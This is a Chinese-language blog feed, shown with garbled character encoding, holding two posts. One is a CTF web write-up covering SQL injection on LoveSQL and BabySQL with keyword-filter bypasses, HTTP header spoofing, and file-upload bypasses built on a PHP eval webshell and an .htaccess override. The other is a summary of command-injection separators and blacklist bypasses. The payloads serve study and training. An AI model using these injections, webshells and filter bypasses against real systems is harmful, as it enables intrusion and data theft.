  
  
  <entry>
    <title>WebWriteUp2</title>
    <link href="/2024/01/29/WebWriteUp2/"/>
    <url>/2024/01/29/WebWriteUp2/</url>
    
    <content type="html"><![CDATA[<h4 id="æå®¢å¤§æŒ‘æˆ˜-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜]LoveSQL</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240129193528686.png" alt="image-20240129193528686"></p><p><strong>åˆ¤æ–­æ³¨å…¥ç±»å‹</strong></p><p>å°è¯•éšä¾¿ä¸€ä¸ªç”¨æˆ·åï¼Œå¯†ç ï¼ˆ1ï¼Œ2ï¼‰ï¼Œæœ‰å›æ˜¾</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129193607847.png" alt="image-20240129193607847"></p><p>å°è¯•1â€™ , 2â€˜ï¼Œ</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129194525961.png" alt="image-20240129194525961"></p><p>è¯´æ˜æ˜¯å­—ç¬¦å‹æ³¨å…¥</p><p><strong>åˆ¤æ–­å­—æ®µæ•°</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>æ­£ç¡®å›æ˜¾ä¸ºï¼š</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129200215904.png" alt="image-20240129200215904"></p><p>ä½†æµ‹åˆ°4æ—¶</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129200235708.png" alt="image-20240129200235708"></p><p>è¯´æ˜æœ‰3ä¸ªå­—æ®µ</p><p><strong>ç¡®å®šå­—æ®µé¡ºåº</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240129201434511.png" alt="image-20240129201434511"></p><p>ä¸éš¾çŒœæµ‹ï¼Œç¬¬äºŒåˆ—æ”¾çš„æ˜¯ç”¨æˆ·åï¼Œç¬¬ä¸‰åˆ—æ”¾çš„æ˜¯å¯†ç </p><p><strong>çˆ†å‡ºå½“å‰æ•°æ®åº“&#x2F;è¡¨ä¿¡æ¯</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1, group_concat(table_name),3  from information_schema.tables where table_schema=database() #</span><br></code></pre></td></tr></table></figure><p><code>SELECT 1, GROUP_CONCAT(table_name)ï¼Œ3 FROM information_schema.tables WHERE table_schema=database()</code>: è¿™æ˜¯æ–°çš„ SELECT è¯­å¥ï¼Œå®ƒé€‰æ‹©äº†ä¸‰åˆ—ã€‚ç¬¬ä¸€åˆ—æ˜¯æ•°å­— 1ï¼Œç¬¬äºŒåˆ—æ˜¯ä½¿ç”¨ <code>GROUP_CONCAT(table_name)</code> æ¥è·å–å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„è¡¨åï¼Œå¹¶å°†å…¶ä»¥é€—å·åˆ†éš”çš„å½¢å¼åˆå¹¶ã€‚</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129202306472.png" alt="image-20240129202306472"></p><p>å¾—åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼Œçœ‹è¡¨åå°±å¤§æ¦‚çŒœæµ‹flagè—åœ¨äº†l0veysq1ä¸­</p><p>æ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&quot;l0ve1ysq1&quot; #</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240129202719431.png" alt="image-20240129202719431"></p><p>å¾—åˆ°è¡¨ä¿¡æ¯</p><p>é‚£idåº”è¯¥æ˜¯æ²¡å•¥å¥½çœ‹çš„ï¼Œusernameå’Œpasswordä¸€ä¸ªä¸ªçœ‹</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs capnproto"><span class="hljs-number">2</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(username) <span class="hljs-keyword">from</span> l0ve1ysq1 <span class="hljs-comment">#</span><br><span class="hljs-number">2</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(password) <span class="hljs-keyword">from</span> l0ve1ysq1 <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>usernameç»“æœï¼š</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129203058464.png" alt="image-20240129203058464"></p><p>passwordç»“æœï¼šï¼ˆflagåœ¨åè¾¹æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼‰</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129203226970.png" alt="image-20240129203226970"></p><p>ä»usernameä¸­ï¼Œå¯ä»¥çœ‹åˆ°flagåœ¨ç¬¬16ä¸ª</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">2</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(password) <span class="hljs-keyword">from</span> l0ve1ysq1 <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">16</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240129203347091.png" alt="image-20240129203347091"></p><p>å¾—åˆ°flag</p><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240129204030753.png" alt="image-20240129204030753"></p><p>è¿›å»ä¹‹åï¼š</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129204143184.png" alt="image-20240129204143184"></p><p>é¢˜ç›®æ˜¯httpï¼Œé‚£æŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129204449368.png" alt="image-20240129204449368"></p><p>å‘ç°åœ¨è¿™é‡Œæœ‰ä¸ªSecret.phpï¼Œç»§ç»­è®¿é—®å¹¶æŠ“åŒ…</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129204922741.png" alt="image-20240129204922741"></p><p>ä¿®æ”¹è¯·æ±‚å¤´</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129210432363.png" alt="image-20240129210432363"></p><p>æç¤ºä¸æ˜¯ç”¨è¿™ä¸ªæµè§ˆå™¨ï¼Œä¿®æ”¹User-Agent</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129210609473.png" alt="image-20240129210609473"></p><p>æç¤ºåªèƒ½åœ¨æœ¬åœ°ï¼Œä¿®æ”¹X-Forwarded-For</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129210734419.png" alt="image-20240129210734419"></p><blockquote><p>X-Forwarded-Foræ˜¯ä¸€ä¸ª HTTP å¤´éƒ¨å­—æ®µï¼Œç”¨äºæ ‡è¯†å®¢æˆ·ç«¯çš„åŸå§‹ IP åœ°å€ï¼Œå½“è¯·æ±‚é€šè¿‡ä»£ç†æœåŠ¡å™¨æˆ–è´Ÿè½½å‡è¡¡å™¨ç­‰ä¸­é—´è®¾å¤‡æ—¶ï¼Œè¿™ä¸ªå¤´éƒ¨å­—æ®µå¯ä»¥åŒ…å«å¤šä¸ª IP åœ°å€ï¼Œæ¯ä¸ª IP åœ°å€ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip</p><p><code>client_ip</code> æ˜¯æœ€åˆçš„å®¢æˆ·ç«¯ IP åœ°å€ï¼Œè€Œ <code>proxy1_ip</code> å’Œ <code>proxy2_ip</code> æ˜¯ç»è¿‡çš„ä»£ç†æœåŠ¡å™¨çš„ IP åœ°å€ã€‚è¿™ä¸ªå¤´éƒ¨å­—æ®µçš„å€¼æ˜¯ä¸€ä¸ªæœ‰åºçš„åˆ—è¡¨ï¼Œè¡¨ç¤ºè¯·æ±‚çš„è·¯å¾„ã€‚</p></blockquote><h4 id="æå®¢å¤§æŒ‘æˆ˜-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜]Upload</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240130111913856.png" alt="image-20240130111913856"></p><p>å…ˆå†™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä¿å­˜ä¸ºwebshell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;webshell&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ è¯•è¯•</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130152023401.png" alt="image-20240130152023401"></p><p>é‚£ä¹ˆæŠ“åŒ…ä¿®æ”¹content-typeè¯•è¯•</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130112036648.png" alt="image-20240130112036648"></p><p>æ£€æµ‹äº†åç¼€åï¼Œè¿™ä¸ªçš„ç»•è¿‡å¯ä»¥ä½¿ç”¨ä¸€äº›ä¸å¸¸ç”¨çš„åç¼€åï¼Œå°è¯•åå‘ç°phptå’Œphpmléƒ½å¯ä»¥</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130112235135.png" alt="image-20240130112235135"></p><p>&amp;#x3cå’Œ&amp;#x3F æ˜¯ HTML ä¸­çš„å®ä½“ç¼–ç ï¼Œè¡¨ç¤º Unicode å­—ç¬¦ï¼Œåˆ†åˆ«ä»£è¡¨ <code>&lt;</code> å’Œ <code>?</code> å­—ç¬¦ã€‚</p><p>è¯´æ˜æ£€æµ‹äº†ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œå¦‚æœphpæ ¼å¼è¢«è¿‡æ»¤çš„è¯ï¼Œå°è¯•.htaccessæ–‡ä»¶è¯•è¯•</p><blockquote><p>macåˆ›å»º.htaccessæ–‡ä»¶çš„æ–¹æ³•ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.finder AppleShowAllFiles -<span class="hljs-built_in">boolean</span> <span class="hljs-literal">true</span> ; killall Finder<br></code></pre></td></tr></table></figure><p>åˆ›å»ºå®Œï¼Œä¸ºäº†ä¿æŠ¤ä¸€äº›éšè—æ–‡ä»¶çš„å®‰å…¨ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.finder AppleShowAllFiles -<span class="hljs-built_in">boolean</span> <span class="hljs-literal">false</span> ; killall Finder<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;FilesMatch &quot;shell&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå¯ä»¥ä¿®æ”¹ç½‘é¡µé…ç½®æ–‡ä»¶ï¼Œè®©åè¾¹çš„åä¸ºshellçš„æ–‡ä»¶è¢«å½“ä½œphpæ‰§è¡Œï¼ŒæŠŠ.htaccessæ–‡ä»¶ä¸Šä¼ </p><p><img src="/2024/01/29/WebWriteUp2/image-20240130154708383.png" alt="image-20240130154708383"></p><p>ä¸Šä¼ å¤±è´¥ï¼Œè¯´æ˜åº”è¯¥æ˜¯å¯¹æ–‡ä»¶å¤´è¿›è¡Œäº†æ£€æµ‹ï¼Œé€šè¿‡GIF89aè¿›è¡Œç»•è¿‡</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130155710696.png" alt="image-20240130155710696"></p><p>æˆåŠŸä¸Šä¼ </p><p>å†åˆ›å»ºä¸€ä¸ªï¼ŒåŒ…å«ä¸€å¥è¯æœ¨é©¬ï¼Œåä¸ºshellï¼Œä¸å¸¦åç¼€çš„æ–‡ä»¶ï¼Œç”¨åŒæ ·æ–¹æ³•ä¸Šä¼ åï¼Œä½¿ç”¨èšå‰‘è¿æ¥å³å¯ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130162424288.png" alt="image-20240130162424288"></p><p>è¿˜æœ‰ä¸­ç»•è¿‡&lt;?çš„æ–¹æ³•ï¼Œåˆ©ç”¨js+php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;èšå‰‘è¿æ¥æ—¶çš„å¯†ç &#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240130202934843.png" alt="image-20240130202934843"></p><p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªï¼Œæç¤º</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130203012711.png" alt="image-20240130203012711"></p><p>ç¦ç”¨å‰ç«¯jsè¯•è¯•</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130203250380.png" alt="image-20240130203250380"></p><p>æç¤ºé”™è¯¯ï¼ŒæŠ“åŒ…é‡æ”¾è¯•è¯•</p><p>æœ‰äº†ä¸Šä¸€é¢˜çš„ç»éªŒï¼Œè¿™é¢˜å°±å¾ˆç®€å•äº†</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130203512966.png" alt="image-20240130203512966"></p><p>ä¸Šä¼ æˆåŠŸä¹‹åç”¨èšå‰‘è¿æ¥,flagåœ¨æ ¹ç›®å½•ä¸‹</p><h4 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240131205347324.png" alt="image-20240131205347324"></p><p>è¿˜æ˜¯è¿™ä¸ªç†Ÿæ‚‰çš„ç•Œé¢</p><p><strong>åˆ¤æ–­æ³¨å…¥ç±»å‹</strong></p><p>ä½¿ç”¨1ï¼Œ2è¿›è¡Œæµ‹è¯•ï¼Œæç¤ºç”¨æˆ·åå¯†ç é”™è¯¯</p><p>ä½¿ç”¨1ï¼Œ2â€˜è¿›è¡Œæµ‹è¯•ï¼Œè¯´æ˜æ³¨å…¥ä¸ºå­—ç¬¦å‹</p><p><img src="/2024/01/29/WebWriteUp2/image-20240131205636587.png" alt="image-20240131205636587"></p><p>ç¡®å®šå­—æ®µæ•°ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211123806.png" alt="image-20240131211123806"></p><p>çœ‹æŠ¥é”™ï¼Œå‘ç°union,selectä¸è§äº†ï¼Œåº”è¯¥æ˜¯è¢«ç›´æ¥æ›¿æ¢æˆäº†ç©ºå­—ç¬¦ï¼Œé‚£ä¹ˆä¿®æ”¹payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; uniunionon seselectlect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211247245.png" alt="image-20240131211247245"></p><p>æˆåŠŸç»•è¿‡ï¼Œä¸”æµ‹è¯•åå‘ç°åªæœ‰ä¸‰ä¸ªå­—æ®µ</p><p>çˆ†åº“ï¼ˆè·ŸLoveSQLä¸€æ ·ï¼‰</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">2</span>&#x27; uniunionon seselectlect <span class="hljs-number">1</span>, group_concat(table_name),<span class="hljs-number">3</span>  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=database() <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211614641.png" alt="image-20240131211614641"></p><p>è¿˜å­˜åœ¨è¿‡æ»¤ï¼Œç»§ç»­ä¿®æ”¹payloadï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; uniunionon seselectlect <span class="hljs-number">1</span>, group_concat(table_name),<span class="hljs-number">3</span>  frfromom infoorrmation_schema.tables whwhereere table_schema=database() #<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211821990.png" alt="image-20240131211821990"></p><p>é‚£ä¹ˆå°è¯•çˆ†b4bsqlè¿™ä¸ªåº“ä¸­çš„è¡¨</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; uniunionon selselectect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131212010267.png" alt="image-20240131212010267"></p><p>æˆåŠŸçˆ†å‡ºè¡¨çš„å†…å®¹</p><p>çˆ†æ•°æ®ï¼Œæ ¹æ®ç»éªŒï¼ŒçŒœæµ‹åœ¨passwordä¸­</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; ununionion seselectlect <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(passwoorrd) frfromom b4bsql #<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131212239814.png" alt="image-20240131212239814"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; ununionion seselectlect <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(passwoorrd) frfromom b4bsql whwhereere id=<span class="hljs-number">8</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131212348021.png" alt="image-20240131212348021"></p><p>å¾—åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‘½ä»¤æ³¨å…¥æ€»ç»“</title>
    <link href="/2024/01/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="å‘½ä»¤è¡Œæ³¨å…¥"><a href="#å‘½ä»¤è¡Œæ³¨å…¥" class="headerlink" title="å‘½ä»¤è¡Œæ³¨å…¥"></a>å‘½ä»¤è¡Œæ³¨å…¥</h2><p>å‘½ä»¤æ³¨å…¥é€šå¸¸å› ä¸ºæŒ‡Webåº”ç”¨åœ¨æœåŠ¡å™¨ä¸Šæ‹¼æ¥ç³»ç»Ÿå‘½ä»¤è€Œé€ æˆçš„æ¼æ´</p><h3 id="å¸¸è§å±é™©å‡½æ•°"><a href="#å¸¸è§å±é™©å‡½æ•°" class="headerlink" title="å¸¸è§å±é™©å‡½æ•°"></a>å¸¸è§å±é™©å‡½æ•°</h3><p>PHP:</p><ul><li>System</li><li>exec</li><li>passthru</li><li>Shell_exec</li><li>popen</li><li>Proc_open</li></ul><p>Python:</p><ul><li>system</li><li>popen</li><li>Subprocess.call</li><li>spawn</li></ul><h3 id="å¸¸è§æ³¨å…¥æ–¹å¼"><a href="#å¸¸è§æ³¨å…¥æ–¹å¼" class="headerlink" title="å¸¸è§æ³¨å…¥æ–¹å¼"></a>å¸¸è§æ³¨å…¥æ–¹å¼</h3><p><strong>åˆ†å·(;)</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;ls</span><br></code></pre></td></tr></table></figure><p>å¤šæ¡è¯­å¥é¡ºåºæ‰§è¡Œ</p><p><strong>ç®¡é“ç¬¦(|)</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2</span><br></code></pre></td></tr></table></figure><p>cmd1å‘½ä»¤çš„è¾“å‡ºä½œä¸ºcmd2çš„å‚æ•°</p><p><strong>and(&amp;&amp;)</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-meta">&amp;&amp; cmd2</span><br></code></pre></td></tr></table></figure><p><strong>or(||)</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">|| cmd2</span><br></code></pre></td></tr></table></figure><p>cmd1æˆåŠŸæ‰§è¡Œåˆ™ä¸æ‰§è¡Œcmd2</p><p><strong>åå¼•å·(&#96;&#96;)å’Œ$()</strong></p><p>è¢«åå¼•å·ä»¥åŠ$()æ‰©èµ·æ¥çš„å­—ç¬¦ä¸²ï¼Œéƒ½ä¼šè¢«å½“ä½œå‘½ä»¤é¦–å…ˆæ‰§è¡Œ</p><h3 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h3><h4 id="ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡ç©ºæ ¼"></a><strong>ç»•è¿‡ç©ºæ ¼</strong></h4><ul><li>${IFS}</li><li>${IFS}$1</li><li>&lt;</li><li>&lt;&gt;</li><li>%09ï¼ˆéœ€è¦phpç¯å¢ƒï¼‰</li></ul><h4 id="ç»•è¿‡é»‘åå•"><a href="#ç»•è¿‡é»‘åå•" class="headerlink" title="ç»•è¿‡é»‘åå•"></a><strong>ç»•è¿‡é»‘åå•</strong></h4><p><strong>æ‹¼æ¥ç»•è¿‡</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">a=c;b=at;c=<span class="hljs-built_in">fl</span>;d=ag;e=.txt;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>;<br></code></pre></td></tr></table></figure><p><strong>base64</strong></p><p>åå¼•å·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;base64è½¬ç çš„å‘½ä»¤&quot;</span> | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>ä¼ é€’ç»™bashï¼šï¼ˆæœ‰æ—¶å€™bashä¼šè¢«è¿‡æ»¤æ‰ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;base64è½¬ç çš„å‘½ä»¤&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>å•å¼•å·ï¼ŒåŒå¼•å·</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">c<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">at</span> fl&#x27;<span class="hljs-symbol">&#x27;ag.tx</span><span class="hljs-string">&quot;&quot;</span>t<br></code></pre></td></tr></table></figure><p>åæ–œæ </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">c\at fl\a\g.tx\t<br></code></pre></td></tr></table></figure><p>é€šé…ç¬¦</p><p>&#x2F;???ä¼šå»å¯»æ‰¾ &#x2F; ç›®å½•ä¸‹çš„ä¸‰ä¸ªå­—ç¬¦é•¿åº¦çš„æ–‡ä»¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¼šå¯»æ‰¾åˆ°&#x2F;binï¼Œç„¶å&#x2F;?[a][t]ä¼šä¼˜å…ˆåŒ¹é…åˆ°&#x2F;bin&#x2F;cat,å°±æˆåŠŸè°ƒç”¨äº†catå‘½ä»¤ï¼Œç„¶ååé¢å¯ä»¥ä½¿ç”¨æ­£å¸¸çš„é€šé…ç¬¦åŒ¹é…æ‰€éœ€è¯»çš„æ–‡ä»¶ï¼Œå¦‚flag.txtæ–‡ä»¶åé•¿åº¦ä¸º8ï¼Œä½¿ç”¨8ä¸ª?â€™â€™ï¼Œæ­¤å‘½ä»¤å°±ä¼šè¯»å–æ‰€æœ‰é•¿åº¦ä¸º8çš„æ–‡ä»¶ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?[</span>a][t] <span class="hljs-string">?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ç»•è¿‡é•¿åº¦é™åˆ¶"><a href="#ç»•è¿‡é•¿åº¦é™åˆ¶" class="headerlink" title="ç»•è¿‡é•¿åº¦é™åˆ¶"></a>ç»•è¿‡é•¿åº¦é™åˆ¶</h3><p><strong>ä½¿ç”¨&gt;&gt;</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;cmd1&quot;</span> &gt; r;<br><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;cmd2&quot;</span> &gt;&gt; r;<br><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;cmd3&quot;</span> &gt;&gt; r;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cmd4&quot;</span> &gt;&gt; r;<br><span class="hljs-comment">#ä½¿ç”¨cat r|bashæ‰§è¡Œ</span><br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ¢è¡Œæ‰§è¡Œ</strong></p><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶a</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ca<span class="hljs-string">\</span><br>t flag.t<span class="hljs-string">\</span><br>xt<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨sh aå³å¯æ‰§è¡Œå‘½ä»¤cat flag.txt</p>]]></content>
    
    
    <categories>
      
